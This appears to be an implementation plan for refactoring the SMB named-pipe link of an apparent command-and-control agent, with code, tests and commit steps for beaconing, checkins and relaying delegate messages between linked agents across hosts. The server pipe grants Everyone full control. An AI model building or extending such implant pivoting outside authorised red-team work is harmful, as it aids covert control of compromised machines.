# SMB Protocol Simplification & Bug Fixes

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all critical bugs, eliminate duplicated chunk reassembly, and simplify the SMB messaging protocol to remove per-chunk acks.

**Architecture:** Extract shared `ChunkedMessageAssembler` used by both SmbProfile and SmbLink. Replace ambiguous `Success` message type with purpose-specific types (`ConnectionReady`, `MessageComplete`, `Error`). Fix all smb plugin bugs (broken unlink, serialization crash, wrong status). Remove per-chunk acks since named pipes provide reliable ordered transport with OS-level flow control.

**Tech Stack:** C# / .NET 10, H.Pipes, MSTest

**Spec:** `docs/superpowers/specs/2026-03-15-smb-improvements-design.md`

---

## File Structure

| File | Action | Responsibility |
|------|--------|----------------|
| `Workflow.Models/Comms/SMB/SmbMessage.cs` | Modify | Update `SmbMessageType` constants |
| `Workflow.Models/Comms/SMB/ChunkedMessageAssembler.cs` | Create | Shared chunk reassembly logic |
| `Tests/Workflow.Tests/PluginTests/ChunkedMessageAssemblerTests.cs` | Create | Tests for assembler |
| `smb/smb.cs` | Modify | Fix unlink, list, status, ForwardDelegate bugs |
| `smb/SmbLink.cs` | Modify | Use assembler, new protocol, IAsyncDisposable |
| `Workflow.Channels.Smb/SmbProfile.cs` | Modify | Use assembler, new protocol, remove dead code |
| `Workflow.Channels.Smb/MessageReceivedArgs.cs` | Delete | Unused class |
| `Tests/Workflow.Tests/PluginTests/SmbPluginTests.cs` | Modify | Tests for smb plugin bug fixes |

---

## Chunk 1: Message Types & ChunkedMessageAssembler

### Task 1: Update SmbMessageType constants

**Files:**
- Modify: `Workflow.Models/Comms/SMB/SmbMessage.cs`

- [ ] **Step 1: Update SmbMessageType constants**

Replace the existing constants with the new protocol types:

```csharp
public static class SmbMessageType
{
    public const string ConnectionReady = "connection_ready";
    public const string Chunked = "chunked_message";
    public const string MessageComplete = "message_complete";
    public const string Error = "error";
}
```

Remove the old `Success` and (if present) `Chunked` constants, replacing them with the four above.

- [ ] **Step 2: Verify it compiles**

Run: `dotnet build Workflow.Models/Workflow.Models.csproj`
Expected: Build succeeded (SmbProfile and SmbLink will have build errors — that's expected and will be fixed in later tasks)

- [ ] **Step 3: Commit**

```bash
git add Workflow.Models/Comms/SMB/SmbMessage.cs
git commit -m "refactor: update SmbMessageType constants for simplified protocol"
```

---

### Task 2: Create ChunkedMessageAssembler

**Files:**
- Create: `Workflow.Models/Comms/SMB/ChunkedMessageAssembler.cs`

- [ ] **Step 1: Create ChunkedMessageAssembler**

```csharp
using System.Collections.Concurrent;
using System.Text;

namespace Workflow.Models
{
    public class ChunkedMessageAssembler
    {
        private readonly ConcurrentDictionary<string, StringBuilder>
            _partialMessages = new();
        private readonly ConcurrentDictionary<string, int>
            _expectedSequence = new();
        private readonly object _lock = new();

        public enum Result
        {
            Accepted,
            Complete,
            OutOfOrder,
        }

        public Result AddChunk(
            string guid,
            int sequence,
            string content,
            bool isFinal,
            out string? fullMessage)
        {
            fullMessage = null;

            lock (_lock)
            {
                _partialMessages.TryAdd(guid, new StringBuilder());
                int expected =
                    _expectedSequence.GetOrAdd(guid, 0);

                if (sequence != expected)
                {
                    _partialMessages.TryRemove(guid, out _);
                    _expectedSequence.TryRemove(guid, out _);
                    return Result.OutOfOrder;
                }

                _expectedSequence[guid] = expected + 1;
                _partialMessages[guid].Append(content);

                if (!isFinal)
                {
                    return Result.Accepted;
                }

                if (_partialMessages.TryRemove(
                        guid, out var sb))
                {
                    fullMessage = sb.ToString();
                }
                _expectedSequence.TryRemove(guid, out _);
                return Result.Complete;
            }
        }

        public void Clear()
        {
            lock (_lock)
            {
                _partialMessages.Clear();
                _expectedSequence.Clear();
            }
        }
    }
}
```

- [ ] **Step 2: Verify it compiles**

Run: `dotnet build Workflow.Models/Workflow.Models.csproj`
Expected: Build succeeded

- [ ] **Step 3: Commit**

```bash
git add Workflow.Models/Comms/SMB/ChunkedMessageAssembler.cs
git commit -m "feat: add ChunkedMessageAssembler for shared chunk reassembly"
```

---

### Task 3: Test ChunkedMessageAssembler

**Files:**
- Create: `Tests/Workflow.Tests/PluginTests/ChunkedMessageAssemblerTests.cs`

- [ ] **Step 1: Write tests**

```csharp
using Workflow.Models;

namespace Workflow.Tests.PluginTests
{
    [TestClass]
    public class ChunkedMessageAssemblerTests
    {
        private ChunkedMessageAssembler _assembler;

        [TestInitialize]
        public void Setup()
        {
            _assembler = new ChunkedMessageAssembler();
        }

        [TestMethod]
        public void SingleChunkMessage_ReturnsComplete()
        {
            var result = _assembler.AddChunk(
                "guid-1", 0, "hello", true, out var msg);

            Assert.AreEqual(
                ChunkedMessageAssembler.Result.Complete, result);
            Assert.AreEqual("hello", msg);
        }

        [TestMethod]
        public void MultiChunkMessage_AssemblesCorrectly()
        {
            var r1 = _assembler.AddChunk(
                "guid-1", 0, "hel", false, out var m1);
            Assert.AreEqual(
                ChunkedMessageAssembler.Result.Accepted, r1);
            Assert.IsNull(m1);

            var r2 = _assembler.AddChunk(
                "guid-1", 1, "lo", true, out var m2);
            Assert.AreEqual(
                ChunkedMessageAssembler.Result.Complete, r2);
            Assert.AreEqual("hello", m2);
        }

        [TestMethod]
        public void OutOfOrderChunk_ReturnsOutOfOrder()
        {
            _assembler.AddChunk(
                "guid-1", 0, "chunk0", false, out _);

            var result = _assembler.AddChunk(
                "guid-1", 5, "chunk5", false, out var msg);

            Assert.AreEqual(
                ChunkedMessageAssembler.Result.OutOfOrder, result);
            Assert.IsNull(msg);
        }

        [TestMethod]
        public void OutOfOrderChunk_ClearsStateForGuid()
        {
            _assembler.AddChunk(
                "guid-1", 0, "chunk0", false, out _);
            _assembler.AddChunk(
                "guid-1", 5, "bad", false, out _);

            // Starting fresh with same guid should work
            // (sequence resets to 0)
            var result = _assembler.AddChunk(
                "guid-1", 0, "fresh", true, out var msg);

            Assert.AreEqual(
                ChunkedMessageAssembler.Result.Complete, result);
            Assert.AreEqual("fresh", msg);
        }

        [TestMethod]
        public void InterleavedMessages_TrackedSeparately()
        {
            _assembler.AddChunk("a", 0, "A0", false, out _);
            _assembler.AddChunk("b", 0, "B0", false, out _);
            _assembler.AddChunk("a", 1, "A1", true, out var msgA);
            _assembler.AddChunk("b", 1, "B1", true, out var msgB);

            Assert.AreEqual("A0A1", msgA);
            Assert.AreEqual("B0B1", msgB);
        }

        [TestMethod]
        public void Clear_DiscardsAllPartialMessages()
        {
            _assembler.AddChunk("a", 0, "partial", false, out _);
            _assembler.AddChunk("b", 0, "partial", false, out _);

            _assembler.Clear();

            // After clear, new messages with same guids
            // should start fresh
            var result = _assembler.AddChunk(
                "a", 0, "new", true, out var msg);

            Assert.AreEqual(
                ChunkedMessageAssembler.Result.Complete, result);
            Assert.AreEqual("new", msg);
        }

        [TestMethod]
        public void EmptyContent_AssemblesCorrectly()
        {
            var result = _assembler.AddChunk(
                "guid-1", 0, "", true, out var msg);

            Assert.AreEqual(
                ChunkedMessageAssembler.Result.Complete, result);
            Assert.AreEqual("", msg);
        }
    }
}
```

- [ ] **Step 2: Run tests to verify they pass**

Run: `dotnet test Tests/Workflow.Tests/Workflow.Tests.csproj --filter "FullyQualifiedName~ChunkedMessageAssemblerTests" -v n`
Expected: All 6 tests PASS

- [ ] **Step 3: Commit**

```bash
git add Tests/Workflow.Tests/PluginTests/ChunkedMessageAssemblerTests.cs
git commit -m "test: add ChunkedMessageAssembler unit tests"
```

---

## Chunk 2: smb Plugin Bug Fixes

### Task 4: Fix smb plugin bugs

**Files:**
- Modify: `smb/smb.cs`
- Modify: `smb/SmbLink.cs` (change `args` visibility)
- Modify: `Tests/Workflow.Tests/PluginTests/SmbPluginTests.cs`

- [ ] **Step 1: Write tests for plugin bug fixes**

These tests exercise the Plugin's `Execute` method for edge cases. They don't require real pipes — they test plugin logic only.

```csharp
using System.Text.Json;
using Workflow.Tests.TestClasses;

namespace Workflow.Tests.PluginTests
{
    [TestClass]
    public class SmbPluginTests
    {
        private TestDataBroker _messageMgr;
        private TestServiceConfig _config;
        private TestLogger _logger;

        [TestInitialize]
        public void Setup()
        {
            _messageMgr = new TestDataBroker();
            _config = new TestServiceConfig();
            _logger = new TestLogger();
        }

        private Plugin CreatePlugin()
        {
            return new Plugin(new Workflow.Contracts.PluginContext(
                _messageMgr, _config, _logger,
                null, null, null));
        }

        [TestMethod]
        public async Task Execute_InvalidParameters_ReturnsError()
        {
            var plugin = CreatePlugin();
            var job = new ServerJob
            {
                task = new ServerTask
                {
                    id = "task-1",
                    command = "smb",
                    parameters = "not-valid-json{{{",
                }
            };

            await plugin.Execute(job);

            Assert.AreEqual(1, _messageMgr.taskResponses.Count);
            var output = _messageMgr.GetRecentOutput();
            Assert.IsTrue(output.Contains("error"));
        }

        [TestMethod]
        public async Task Execute_UnlinkMissingLink_ReturnsFailure()
        {
            var plugin = CreatePlugin();
            var args = new SmbLinkArgs
            {
                action = "unlink",
                pipename = "nonexistent",
                hostname = ".",
            };
            var job = new ServerJob
            {
                task = new ServerTask
                {
                    id = "task-unlink",
                    command = "smb",
                    parameters = JsonSerializer.Serialize(args),
                }
            };

            await plugin.Execute(job);

            Assert.AreEqual(1, _messageMgr.taskResponses.Count);
            var output = _messageMgr.GetRecentOutput();
            Assert.IsTrue(output.Contains("Failed to unlink"));
        }

        [TestMethod]
        public async Task Execute_List_ReturnsResponse()
        {
            var plugin = CreatePlugin();
            var args = new SmbLinkArgs
            {
                action = "list",
                pipename = "test",
                hostname = ".",
            };
            var job = new ServerJob
            {
                task = new ServerTask
                {
                    id = "task-list",
                    command = "smb",
                    parameters = JsonSerializer.Serialize(args),
                }
            };

            await plugin.Execute(job);

            Assert.AreEqual(1, _messageMgr.taskResponses.Count);
        }

        [TestMethod]
        public async Task Execute_UnknownAction_ReturnsError()
        {
            var plugin = CreatePlugin();
            var args = new SmbLinkArgs
            {
                action = "foobar",
                pipename = "test",
                hostname = ".",
            };
            var job = new ServerJob
            {
                task = new ServerTask
                {
                    id = "task-unknown",
                    command = "smb",
                    parameters = JsonSerializer.Serialize(args),
                }
            };

            await plugin.Execute(job);

            Assert.AreEqual(1, _messageMgr.taskResponses.Count);
            var output = _messageMgr.GetRecentOutput();
            Assert.IsTrue(output.Contains("Unknown action"));
        }
    }
}
```

- [ ] **Step 2: Run tests to see which fail (exposing current bugs)**

Run: `dotnet test Tests/Workflow.Tests/Workflow.Tests.csproj --filter "FullyQualifiedName~SmbPluginTests" -v n`
Expected: `Execute_UnlinkMissingLink_ReturnsFailure` FAILS (throws `KeyNotFoundException`). `Execute_UnknownAction_ReturnsError` FAILS (no response added). `Execute_List_ReturnsResponse` may FAIL (serialization crash). `Execute_InvalidParameters_ReturnsError` should PASS.

- [ ] **Step 3: Change SmbLink.args from private to internal**

In `smb/SmbLink.cs`, change:
```csharp
private SmbLinkArgs args { get; set; }
```
to:
```csharp
internal SmbLinkArgs args { get; set; }
```

- [ ] **Step 4: Fix all bugs in smb.cs**

Replace the entire content of `smb/smb.cs` with:

```csharp
using Workflow.Contracts;
using Workflow.Models;
using System.Collections.Concurrent;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule, IForwarderModule
    {
        public string Name => "smb";
        private IServiceConfig config { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<string, SmbLink> forwarders =
            new ConcurrentDictionary<string, SmbLink>();

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.config = context.Config;
            this.logger = context.Logger;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            SmbLinkArgs args;
            try
            {
                args = JsonSerializer
                    .Deserialize<SmbLinkArgs>(
                        job.task.parameters);
            }
            catch (JsonException)
            {
                args = null;
            }

            if (args is null)
            {
                DebugLog.Log(
                    $"{Name} invalid parameters [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse
                {
                    task_id = job.task.id,
                    user_output = "Invalid parameters.",
                    status = "error",
                    completed = true,
                });
                return;
            }

            DebugLog.Log(
                $"{Name} action={args.action} [{job.task.id}]");

            switch (args.action)
            {
                case "link":
                    await CreateNewLink(args, job.task.id);
                    break;
                case "unlink":
                    await UnlinkAgent(args, job.task.id);
                    break;
                case "list":
                    ListConnections(job);
                    break;
                default:
                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        task_id = job.task.id,
                        user_output =
                            $"Unknown action: {args.action}",
                        status = "error",
                        completed = true,
                    });
                    break;
            }
        }

        public async Task CreateNewLink(
            SmbLinkArgs args, string task_id)
        {
            var link = new SmbLink(
                messageManager, logger, args,
                config.uuid, task_id);

            EdgeResponse result = await link.Link();

            if (result.edges.Count > 0
                && !string.IsNullOrEmpty(link.linked_agent_id))
            {
                this.forwarders.TryAdd(
                    link.linked_agent_id, link);
            }

            this.messageManager.AddTaskResponse(result.ToJson());
        }

        private async Task UnlinkAgent(
            SmbLinkArgs args, string task_id)
        {
            var match = this.forwarders.FirstOrDefault(
                f => f.Value.args.hostname == args.hostname
                    && f.Value.args.pipename == args.pipename);

            if (match.Value == null)
            {
                this.messageManager.AddTaskResponse(
                    new TaskResponse
                    {
                        task_id = task_id,
                        user_output = "Failed to unlink.",
                        status = "error",
                        completed = true,
                    });
                return;
            }

            bool success = await match.Value.Unlink();

            if (success)
            {
                this.forwarders.TryRemove(match.Key, out _);
                this.messageManager.AddTaskResponse(
                    new TaskResponse
                    {
                        task_id = task_id,
                        user_output = "Link removed.",
                        completed = true,
                    });
            }
            else
            {
                this.messageManager.AddTaskResponse(
                    new TaskResponse
                    {
                        task_id = task_id,
                        user_output = "Failed to unlink.",
                        status = "error",
                        completed = true,
                    });
            }
        }

        public async Task ForwardDelegate(DelegateMessage dm)
        {
            DebugLog.Log($"{Name} ForwardDelegate uuid={dm.uuid}");
            var match = this.forwarders.FirstOrDefault(
                a => a.Value.linked_agent_id == dm.uuid
                    || a.Value.linked_agent_id == dm.new_uuid);

            if (match.Value == null)
            {
                return;
            }

            if (!string.IsNullOrEmpty(dm.new_uuid))
            {
                match.Value.linked_agent_id = dm.new_uuid;
            }

            await match.Value.ForwardDelegateMessage(dm);
        }

        public void ListConnections(ServerJob job)
        {
            var linkInfos = this.forwarders
                .Select(kvp => new
                {
                    linked_agent_id = kvp.Value.linked_agent_id,
                    connected = kvp.Value.connected,
                    pipename = kvp.Value.args.pipename,
                    hostname = kvp.Value.args.hostname,
                })
                .ToList();

            this.messageManager.AddTaskResponse(
                new TaskResponse
                {
                    user_output =
                        JsonSerializer.Serialize(linkInfos),
                    task_id = job.task.id,
                    completed = true,
                });
        }
    }
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `dotnet test Tests/Workflow.Tests/Workflow.Tests.csproj --filter "FullyQualifiedName~SmbPluginTests" -v n`
Expected: All 4 tests PASS

- [ ] **Step 6: Commit**

```bash
git add smb/smb.cs smb/SmbLink.cs Tests/Workflow.Tests/PluginTests/SmbPluginTests.cs
git commit -m "fix: correct unlink key mismatch, serialization crash, error status, and silent no-op in smb plugin"
```

---

## Chunk 3: SmbLink Protocol Refactor

### Task 5: Refactor SmbLink to use new protocol

**Files:**
- Modify: `smb/SmbLink.cs`

- [ ] **Step 1: Refactor SmbLink**

Replace `smb/SmbLink.cs` with the following. Key changes:
- Replace `partialMessages`/`expectedSequence` with `ChunkedMessageAssembler`
- Replace `AutoResetEvent messageSuccess` with `TaskCompletionSource<string> connectionTcs` + `ManualResetEventSlim messageAck`
- `OnMessageReceive`: route by new message types (`ConnectionReady`, `MessageComplete`, `Chunked`, `Error`)
- `Link()`: await `connectionTcs.Task` for handshake
- `ForwardDelegateMessage()`: send all chunks in tight loop, wait once for `message_complete`
- Implement `IAsyncDisposable` instead of `IDisposable`, disposing both `messageAck` and `clientPipe`

```csharp
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using H.Pipes;
using H.Pipes.Args;

namespace Workflow
{
    public class SmbLink : IAsyncDisposable
    {
        private PipeClient<SmbMessage> clientPipe { get; set; }
        public bool connected { get; set; }
        private string task_id { get; set; }
        internal SmbLinkArgs args { get; set; }
        private string agent_id { get; set; }
        public string linked_agent_id { get; set; }
        private TaskCompletionSource<string> connectionTcs =
            new TaskCompletionSource<string>();
        private ManualResetEventSlim messageAck =
            new ManualResetEventSlim(false);
        private ChunkedMessageAssembler assembler = new();
        IDataBroker messageManager { get; set; }
        ILogger logger { get; set; }
        private bool disposed = false;

        private const int ConnectionTimeoutMs = 30000;
        private const int MessageAckTimeoutMs = 15000;
        private const int ChunkSize = 32768;

        public SmbLink(
            IDataBroker messageManager,
            ILogger logger,
            SmbLinkArgs args,
            string agent_id,
            string task_id)
        {
            this.agent_id = agent_id;
            this.messageManager = messageManager;
            this.logger = logger;
            this.task_id = task_id;
            this.args = args;
        }

        public async Task<EdgeResponse> Link()
        {
            try
            {
                if (this.clientPipe == null || !this.connected)
                {
                    if (this.clientPipe != null)
                    {
                        await this.clientPipe.DisposeAsync();
                    }

                    this.clientPipe =
                        new PipeClient<SmbMessage>(
                            args.pipename, args.hostname);
                    this.clientPipe.MessageReceived +=
                        async (o, a) =>
                            await OnMessageReceive(a);
                    this.clientPipe.Connected +=
                        (o, _) => this.connected = true;
                    this.clientPipe.Disconnected +=
                        (o, _) => this.connected = false;

                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        this.connected = true;

                        var cts = new CancellationTokenSource(
                            ConnectionTimeoutMs);
                        try
                        {
                            this.linked_agent_id =
                                await connectionTcs.Task
                                    .WaitAsync(cts.Token);
                        }
                        catch (OperationCanceledException)
                        {
                            return new EdgeResponse
                            {
                                task_id = task_id,
                                user_output =
                                    "Timed out waiting for "
                                    + "agent UUID",
                                completed = true,
                                edges = new List<Edge>()
                            };
                        }

                        return new EdgeResponse
                        {
                            task_id = task_id,
                            user_output =
                                "Established link with "
                                + "pipe.\r\n"
                                + $"{this.agent_id} -> "
                                + $"{this.linked_agent_id}",
                            completed = true,
                            edges = new List<Edge>
                            {
                                new Edge
                                {
                                    destination =
                                        this.linked_agent_id,
                                    source = this.agent_id,
                                    action = "add",
                                    c2_profile = "smb",
                                    metadata = string.Empty
                                }
                            }
                        };
                    }
                }
            }
            catch (Exception e)
            {
                return new EdgeResponse
                {
                    task_id = task_id,
                    user_output = e.ToString(),
                    completed = true,
                    edges = new List<Edge>()
                };
            }

            return new EdgeResponse
            {
                task_id = task_id,
                user_output =
                    "Failed to establish link with pipe",
                completed = true,
                edges = new List<Edge>()
            };
        }

        private Task OnMessageReceive(
            ConnectionMessageEventArgs<SmbMessage> args)
        {
            try
            {
                switch (args.Message.message_type)
                {
                    case SmbMessageType.ConnectionReady:
                        connectionTcs.TrySetResult(
                            args.Message.agent_guid);
                        break;

                    case SmbMessageType.MessageComplete:
                        messageAck.Set();
                        break;

                    case SmbMessageType.Error:
                        DebugLog.Log(
                            "SMB link received error: "
                            + args.Message.delegate_message);
                        break;

                    case SmbMessageType.Chunked:
                        var result = assembler.AddChunk(
                            args.Message.guid,
                            args.Message.sequence,
                            args.Message.delegate_message,
                            args.Message.final,
                            out string? fullMessage);

                        if (result
                            == ChunkedMessageAssembler
                                .Result.OutOfOrder)
                        {
                            DebugLog.Log(
                                "SMB link chunk out of order"
                                + ", discarding");
                            break;
                        }

                        if (result
                            == ChunkedMessageAssembler
                                .Result.Complete
                            && fullMessage != null)
                        {
                            var dm = new DelegateMessage
                            {
                                c2_profile = "smb",
                                message = fullMessage,
                                uuid = args.Message.agent_guid,
                            };
                            this.messageManager
                                .AddDelegateMessage(dm);
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                DebugLog.Log(
                    "SMB link OnMessageReceive error: "
                    + ex.Message);
            }

            return Task.CompletedTask;
        }

        public async Task<bool> Unlink()
        {
            try
            {
                if (this.clientPipe != null)
                {
                    await this.clientPipe.DisconnectAsync();
                    await this.clientPipe.DisposeAsync();
                }
                return true;
            }
            catch (Exception ex)
            {
                DebugLog.Log(
                    $"SMB link Unlink error: {ex.Message}");
                return false;
            }
            finally
            {
                this.connected = false;
                assembler.Clear();
            }
        }

        public async Task<bool> ForwardDelegateMessage(
            DelegateMessage dm)
        {
            try
            {
                messageAck.Reset();
                var parts = dm.message
                    .SplitByLength(ChunkSize).ToList();

                string messageGuid =
                    Guid.NewGuid().ToString();

                for (int i = 0; i < parts.Count; i++)
                {
                    var sm = new SmbMessage
                    {
                        guid = messageGuid,
                        message_type = SmbMessageType.Chunked,
                        agent_guid = agent_id,
                        delegate_message = parts[i],
                        final = (i == parts.Count - 1),
                        sequence = i,
                    };

                    await this.clientPipe.WriteAsync(sm);
                }

                if (!messageAck.Wait(MessageAckTimeoutMs))
                {
                    DebugLog.Log(
                        "SMB link ack timeout for message "
                        + messageGuid);
                    return false;
                }

                return true;
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    "SMB link ForwardDelegateMessage error: "
                    + e.Message);
                return false;
            }
        }

        public async ValueTask DisposeAsync()
        {
            if (disposed) return;
            disposed = true;

            messageAck.Dispose();
            if (clientPipe != null)
            {
                await clientPipe.DisposeAsync();
            }
        }
    }
}
```

- [ ] **Step 2: Verify it compiles**

Run: `dotnet build smb/smb.csproj`
Expected: Build succeeded

- [ ] **Step 3: Re-run plugin tests to verify nothing broke**

Run: `dotnet test Tests/Workflow.Tests/Workflow.Tests.csproj --filter "FullyQualifiedName~SmbPluginTests" -v n`
Expected: All 4 tests PASS

- [ ] **Step 4: Commit**

```bash
git add smb/SmbLink.cs
git commit -m "refactor: SmbLink uses ChunkedMessageAssembler, new protocol types, IAsyncDisposable"
```

---

## Chunk 4: SmbProfile Protocol Refactor & Cleanup

### Task 6: Refactor SmbProfile to use new protocol

**Files:**
- Modify: `Workflow.Channels.Smb/SmbProfile.cs`

- [ ] **Step 1: Refactor SmbProfile**

Replace `Workflow.Channels.Smb/SmbProfile.cs` with the following. Key changes:
- Replace `partialMessages`/`expectedSequence`/`disconnectLock` with `ChunkedMessageAssembler`
- Replace `ManualResetEventSlim checkinAvailable` + `CheckinResponse cir` with `TaskCompletionSource<CheckinResponse> checkinTcs`
- Remove `volatile bool connected` (use `clientConnected.IsSet`)
- Remove `SendUpdate()` (duplicate of `SendSuccess()`)
- `Send()` returns `Task` instead of `Task<string>`
- `OnClientConnection()` sends `ConnectionReady` instead of `Success`
- `OnMessageReceive()` uses assembler, sends `MessageComplete` on complete, `Error` on out-of-order
- `StartBeacon()` uses existing CTS (no longer creates new one)
- `Checkin()` uses `checkinTcs.Task.WaitAsync()` with timeout, creates fresh TCS on retry

```csharp
using Workflow.Contracts;
using Workflow.Utilities;
using System.Text.Json;
using Workflow.Models;
using Workflow.Channels.Smb;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using H.Pipes;
using H.Pipes.AccessControl;
using H.Pipes.Args;

namespace Workflow.Channels
{
    public class SmbProfile : IChannel, IAsyncDisposable
    {
        private IServiceConfig agentConfig { get; set; }
        private ISecurityProvider crypt { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private string pipeName;
        private int chunkSize;
        private int connectionTimeoutMs;
        private int checkinTimeoutMs;
        private ChunkedMessageAssembler assembler = new();
        private PipeServer<SmbMessage> serverPipe { get; set; }
        private TaskCompletionSource<CheckinResponse>
            checkinTcs = new();
        private ManualResetEventSlim clientConnected =
            new ManualResetEventSlim(false);
        public event EventHandler<TaskingReceivedArgs>?
            SetTaskingReceived;

        private bool checkedin = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private bool disposed = false;
        private CancellationTokenSource cancellationTokenSource
            { get; set; } = new CancellationTokenSource();

        public SmbProfile(
            IServiceConfig config,
            ISecurityProvider crypto,
            ILogger logger,
            IDataBroker messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                SmbChannelOptionsJsonContext.Default
                    .SmbChannelOptions);

            this.pipeName = opts.PipeName;
            this.chunkSize = opts.ChunkSize;
            this.connectionTimeoutMs =
                opts.ConnectionTimeoutSeconds * 1000;
            this.checkinTimeoutMs =
                opts.CheckinTimeoutSeconds * 1000;
            DebugLog.Log($"SMB pipe name: {this.pipeName}");

            this.serverPipe =
                new PipeServer<SmbMessage>(this.pipeName);
            if (OperatingSystem.IsWindows())
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(
                    new PipeAccessRule(
                        new SecurityIdentifier(
                            WellKnownSidType.WorldSid, null),
                        PipeAccessRights.FullControl,
                        AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }

            this.serverPipe.ClientConnected +=
                async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected +=
                async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived +=
                async (sender, args) =>
                    await OnMessageReceive(args);
            this.serverPipe.StartAsync(
                this.cancellationTokenSource.Token);
            DebugLog.Log("SMB server pipe started");
        }

        public async Task<CheckinResponse> Checkin(
            Checkin checkin)
        {
            DebugLog.Log("SMB sending checkin");
            this.checkinTcs =
                new TaskCompletionSource<CheckinResponse>();
            await this.Send(
                JsonSerializer.Serialize(
                    checkin,
                    CheckinJsonContext.Default.Checkin));

            DebugLog.Log("SMB waiting for checkin response");
            var cts = new CancellationTokenSource(
                this.checkinTimeoutMs);
            try
            {
                var result = await checkinTcs.Task
                    .WaitAsync(cts.Token);
                this.checkedin = true;
                DebugLog.Log("SMB checkin complete");
                return result;
            }
            catch (OperationCanceledException)
            {
                DebugLog.Log("SMB checkin timed out");
                throw new TimeoutException(
                    $"SMB checkin timed out after "
                    + $"{this.checkinTimeoutMs}ms");
            }
        }

        public async Task StartBeacon()
        {
            while (!cancellationTokenSource.Token
                .IsCancellationRequested)
            {
                if (!this.messageManager.HasResponses())
                {
                    try
                    {
                        await Task.Delay(
                            500,
                            cancellationTokenSource.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                    continue;
                }

                try
                {
                    DebugLog.Log(
                        "SMB beacon sending responses");
                    await this.Send(
                        messageManager
                            .GetAgentResponseString());
                    this.currentAttempt = 0;
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                    DebugLog.Log(
                        $"SMB beacon send failed: "
                        + $"{e.Message}, attempt "
                        + $"{this.currentAttempt}/"
                        + $"{this.maxAttempts}");
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    DebugLog.Log(
                        "SMB beacon max attempts reached");
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        internal async Task Send(string json)
        {
            if (!clientConnected.IsSet)
            {
                DebugLog.Log(
                    "SMB Send waiting for client");
                if (!clientConnected.Wait(
                        this.connectionTimeoutMs))
                {
                    throw new TimeoutException(
                        $"SMB connection timed out after "
                        + $"{this.connectionTimeoutMs}ms");
                }
            }

            DebugLog.Log(
                $"SMB Send ({json.Length} chars)");
            json = this.crypt.Encrypt(json);
            List<string> parts =
                json.SplitByLength(this.chunkSize).ToList();
            DebugLog.Log(
                $"SMB Send chunking into {parts.Count} parts");

            string messageGuid = Guid.NewGuid().ToString();
            for (int i = 0; i < parts.Count; i++)
            {
                SmbMessage sm = new SmbMessage()
                {
                    guid = messageGuid,
                    final = (i == parts.Count - 1),
                    message_type = SmbMessageType.Chunked,
                    agent_guid = agentConfig.uuid,
                    delegate_message = parts[i],
                    sequence = i,
                };
                await this.serverPipe.WriteAsync(sm);
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private async Task SendMessageComplete()
        {
            var sm = new SmbMessage
            {
                guid = Guid.NewGuid().ToString(),
                message_type = SmbMessageType.MessageComplete,
                final = true,
                delegate_message = string.Empty,
                agent_guid = agentConfig.uuid,
                sequence = 0,
            };
            await this.serverPipe.WriteAsync(sm);
        }

        private async Task SendError(string errorMessage)
        {
            var sm = new SmbMessage
            {
                guid = Guid.NewGuid().ToString(),
                message_type = SmbMessageType.Error,
                final = true,
                delegate_message = errorMessage,
                agent_guid = agentConfig.uuid,
                sequence = 0,
            };
            await this.serverPipe.WriteAsync(sm);
        }

        private async Task OnMessageReceive(
            ConnectionMessageEventArgs<SmbMessage> args)
        {
            try
            {
                DebugLog.Log(
                    $"SMB message received, type: "
                    + args.Message.message_type);

                switch (args.Message.message_type)
                {
                    case SmbMessageType.ConnectionReady:
                    case SmbMessageType.MessageComplete:
                    case SmbMessageType.Error:
                        return;

                    case SmbMessageType.Chunked:
                        break;

                    default:
                        return;
                }

                var result = assembler.AddChunk(
                    args.Message.guid,
                    args.Message.sequence,
                    args.Message.delegate_message,
                    args.Message.final,
                    out string? fullMessage);

                DebugLog.Log(
                    $"SMB chunk result: {result}, "
                    + $"guid: {args.Message.guid}, "
                    + $"seq: {args.Message.sequence}");

                if (result
                    == ChunkedMessageAssembler.Result
                        .OutOfOrder)
                {
                    DebugLog.Log(
                        "SMB chunk out of order, discarding");
                    await this.SendError(
                        "Out of order chunk");
                    return;
                }

                if (result
                    == ChunkedMessageAssembler.Result.Complete
                    && fullMessage != null)
                {
                    await this.OnMessageReceiveComplete(
                        fullMessage);
                    await this.SendMessageComplete();
                }
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    $"SMB OnMessageReceive error: "
                    + e.Message);
            }
        }

        private async Task OnClientConnection()
        {
            DebugLog.Log("SMB client connected");
            clientConnected.Set();
            var sm = new SmbMessage
            {
                guid = Guid.NewGuid().ToString(),
                message_type = SmbMessageType.ConnectionReady,
                final = true,
                delegate_message = string.Empty,
